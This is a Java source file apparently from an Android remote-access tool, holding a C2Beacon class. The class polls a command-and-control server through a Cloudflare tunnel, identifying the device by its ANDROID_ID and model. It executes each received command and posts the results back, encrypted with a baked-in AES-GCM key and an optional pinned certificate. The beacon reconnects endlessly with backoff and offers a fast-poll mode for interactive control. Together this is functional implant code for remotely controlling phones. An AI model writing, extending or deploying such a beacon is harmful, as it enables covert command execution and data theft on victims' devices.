package com.ohmpi.androremote;

import android.os.Build;
import android.provider.Settings;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.KeyStore;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;
import javax.net.ssl.X509TrustManager;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * Beacons to the C2 server over HTTPS through the Cloudflare tunnel using
 * OkHttp: pooled keep-alive connections (fast interactive control), transparent
 * gzip, automatic retries.
 *
 * Security:
 *  - payloads are AES-256-GCM framed ("ENC1:" + b64(nonce||ct)) with the PSK
 *    baked at build time (~/.androremote/c2.key) — GCM tags authenticate both
 *    directions, a wrong key is silently unusable
 *  - optional TLS certificate pinning: the server's --tls self-signed cert
 *    fingerprint is baked as c2_pin; connections accept the pin OR any
 *    system-trusted CA (Cloudflare edge certs stay valid)
 *  - result POST responses carry the next queued command (pipelining);
 *    FASTPOLL drops the idle interval to ~0.7s for interactive control
 */
public class C2Beacon implements Runnable {
    private static final MediaType TEXT = MediaType.parse("text/plain; charset=utf-8");
    private static final String ENC_PREFIX = "ENC1:";
    private final RemoteService svc;
    private final String base;
    private final byte[] key;      // 32-byte AES-256 PSK or null
    private final byte[] certPin;  // SHA-256 of trusted cert DER or null
    private final String id;
    private final OkHttpClient http;
    private final SecureRandom rnd = new SecureRandom();
    private static volatile long fastUntil = 0L;

    C2Beacon(RemoteService svc, String base, String keyHex, String pinHex) {
        this.svc = svc;
        this.base = base.endsWith("/") ? base.substring(0, base.length() - 1) : base;
        this.key = parseHex(keyHex, 32);
        this.certPin = parseHex(pinHex, 32);
        String aid = null;
        try {
            aid = Settings.Secure.getString(svc.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception ignored) {}
        this.id = aid == null || aid.isEmpty() ? "unknown" : aid;
        OkHttpClient.Builder b = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(15, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true);
        if (certPin != null && base.startsWith("https")) {
            try {
                final X509TrustManager system = systemTm();
                final byte[] pin = certPin;
                X509TrustManager pinned = new X509TrustManager() {
                    @Override
                    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                        system.checkClientTrusted(chain, authType);
                    }
                    @Override
                    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
                        if (chain != null && chain.length > 0) {
                            try {
                                if (Arrays.equals(MessageDigest.getInstance("SHA-256").digest(chain[0].getEncoded()), pin)) {
                                    return; // pinned C2 cert (--tls LAN mode)
                                }
                            } catch (Exception ignored) {}
                        }
                        system.checkServerTrusted(chain, authType); // CA certs (Cloudflare edge)
                    }
                    @Override
                    public X509Certificate[] getAcceptedIssuers() {
                        return system.getAcceptedIssuers();
                    }
                };
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[]{pinned}, new SecureRandom());
                b.sslSocketFactory(ctx.getSocketFactory(), pinned);
            } catch (Exception ignored) {}
        }
        this.http = b.build();
    }

    private static byte[] parseHex(String hex, int len) {
        if (hex == null) return null;
        hex = hex.trim();
        if (hex.length() != len * 2) return null;
        byte[] out = new byte[len];
        try {
            for (int i = 0; i < len; i++) {
                out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
            }
            return out;
        } catch (NumberFormatException e) {
            return null;
        }
    }

    private static X509TrustManager systemTm() throws Exception {
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());
        tmf.init((KeyStore) null);
        for (TrustManager tm : tmf.getTrustManagers()) {
            if (tm instanceof X509TrustManager) return (X509TrustManager) tm;
        }
        throw new IllegalStateException("no X509TrustManager");
    }

    static void setFast(long ms) {
        fastUntil = System.currentTimeMillis() + ms;
    }

    @Override
    public void run() {
        android.util.Log.i("AndroRemoteC2", "beacon start base=" + base + " id=" + id
                + " key=" + (key != null) + " pin=" + (certPin != null));
        // Infinite reconnect: this loop never gives up. Any failure (C2 down,
        // tunnel restarting, airplane mode) backs off exponentially (10s -> 5min
        // cap) and retries. It only exits when its service instance is destroyed;
        // the new instance starts a fresh beacon thread.
        int fails = 0;
        while (!svc.destroyed) {
            try {
                String next = fetchCommand();
                fails = 0; // reachable C2 (even idle) resets backoff
                android.util.Log.i("AndroRemoteC2", "fetch -> " + (next == null ? "null" : "cmd"));
                while (next != null && !svc.destroyed) {
                    next = executeAndPost(next);
                }
            } catch (Throwable t) {
                fails++;
                android.util.Log.w("AndroRemoteC2", "beacon error (retry infinite, fails=" + fails + "): " + t);
            }
            try {
                long fast = fastUntil - System.currentTimeMillis();
                long sleep;
                if (fast > 0) {
                    sleep = 700;
                } else {
                    long extra = fails > 3 ? (1L << Math.min(fails, 8)) * 1000L : 0;
                    sleep = Math.min(300_000L, 10_000L + (long) (Math.random() * 4_000) + extra);
                }
                Thread.sleep(sleep);
            } catch (InterruptedException e) {
                if (svc.destroyed) return; // service torn down: exit, successor restarts
                // otherwise a wake-up (e.g. network back): loop around and retry now
            }
        }
    }

    private String url(String path) throws Exception {
        String model = java.net.URLEncoder.encode(Build.MODEL == null ? "?" : Build.MODEL, "UTF-8");
        return base + path + "?model=" + model;
    }

    private String fetchCommand() throws Exception {
        Request req = new Request.Builder().url(url("/b/" + id)).build();
        try (Response r = http.newCall(req).execute()) {
            String body = r.body() != null ? r.body().string() : "";
            android.util.Log.i("AndroRemoteC2", "fetch code=" + r.code() + " body=" + body.substring(0, Math.min(body.length(), 60)));
            if (r.code() != 200) return null;
            String cmd = dec(body);
            if (cmd == null || cmd.isEmpty()) return null;
            return cmd.split("\n", 2)[0].trim();
        }
    }

    /** Execute cmd, POST the (encrypted) result; the response is the next queued command. */
    private String executeAndPost(String cmd) throws Exception {
        String resp = svc.exec(cmd, null);
        if (resp == null) resp = "OK";
        Request req = new Request.Builder()
                .url(url("/r/" + id))
                .post(RequestBody.create(TEXT, enc(resp)))
                .build();
        try (Response r = http.newCall(req).execute()) {
            String body = r.body() != null ? r.body().string() : "";
            android.util.Log.i("AndroRemoteC2", "post code=" + r.code() + " body=" + body.substring(0, Math.min(body.length(), 60)));
            if (r.code() != 200) return null;
            String next = dec(body);
            if (next == null || next.isEmpty()) return null;
            return next.split("\n", 2)[0].trim();
        }
    }

    private String enc(String plain) throws Exception {
        if (key == null) return plain;
        byte[] nonce = new byte[12];
        rnd.nextBytes(nonce);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, nonce));
        byte[] ct = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
        ByteArrayOutputStream bos = new ByteArrayOutputStream(nonce.length + ct.length);
        bos.write(nonce);
        bos.write(ct);
        return ENC_PREFIX + java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
    }

    /** Decrypt an ENC1 payload. Returns null on auth failure (wrong key). */
    private String dec(String body) {
        if (body == null) return null;
        if (!body.startsWith(ENC_PREFIX)) return body; // plaintext mode (--no-enc)
        if (key == null) return null;
        try {
            byte[] raw = java.util.Base64.getDecoder().decode(body.substring(ENC_PREFIX.length()));
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, raw, 0, 12));
            byte[] pt = c.doFinal(raw, 12, raw.length - 12);
            return new String(pt, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }
}
